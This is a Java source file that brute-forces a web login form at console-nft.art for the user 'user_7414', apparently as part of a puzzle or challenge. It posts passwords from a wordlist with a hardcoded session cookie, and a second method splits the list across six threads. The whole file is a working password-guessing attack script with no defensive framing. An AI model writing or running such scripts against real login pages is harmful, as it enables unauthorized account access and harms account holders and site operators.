package org.millionaire.consolenft;

import com.alibaba.fastjson.JSONObject;
import org.apache.commons.io.FileUtils;
import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.message.BasicHeader;
import org.millionaire.HttpUtils;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;

import static java.nio.charset.StandardCharsets.UTF_8;
import static org.millionaire.CommonUtils.mapToNameValuePairs;

public class PasswordChecked {

    static void brutal() {
        try {
            String path = PasswordChecked.class.getClassLoader().getResource("passwords.txt").getPath();
            File file = new File(path);
            List<String> lines = FileUtils.readLines(file);
            System.out.println(lines.size());
            String uri = "https://console-nft.art/starwars/index.php";
            Header header = new BasicHeader("cookie", "_fbp=fb.1.1642038134911.1484167444; PHPSESSID=b92b85f081cf5222b74b9835f95a5f64");
            Header[] headers = new Header[]{header};
            String data = "name=user_7414&password=";
            for (String line : lines) {
                String text = HttpUtils._post(uri, headers, data + line);
                if (!text.contains("I feel so weak")) {
                    System.out.println("correct: " + line);
                    System.out.println(text);
                    System.exit(1);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    static void efficientBrutal() {
        try {
            String path = PasswordChecked.class.getClassLoader().getResource("passwords.txt").getPath();
            File file = new File(path);
            List<String> lines = FileUtils.readLines(file);

            String uri = "https://console-nft.art/starwars/index.php";
            Header header = new BasicHeader("cookie", "_fbp=fb.1.1642038134911.1484167444; PHPSESSID=b92b85f081cf5222b74b9835f95a5f64");
            Header[] headers = new Header[]{header};
            String data = "name=user_7414&password=";
            AtomicInteger scope = new AtomicInteger(0);
            Runnable task = () -> {
                int start = scope.getAndIncrement() * 500;
                List<String> passwords = lines.subList(start, start + 500);
                System.out.println(Thread.currentThread().getName() + ": " + start + " ~ " + (start + 500));
                int i = 1;
                for (String password : passwords) {
                    System.out.println(Thread.currentThread().getName() + ": [" + (i++) + "] " + password);
                    String text = HttpUtils._post(uri, headers, data + password);
                    if (!text.contains("I feel so weak")) {
                        System.out.println("correct: " + password);
                        System.out.println(text);
                        System.exit(1);
                    }
                }
            };

            List<Thread> threads = new ArrayList<>();
            for (int i = 0; i < 6; i++)
                threads.add(new Thread(task, "#Thread" + i));
            for (Thread thread : threads)
                thread.start();
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }

    }

    public static void main(String[] args) {
//        brutal();
        efficientBrutal();
    }

}
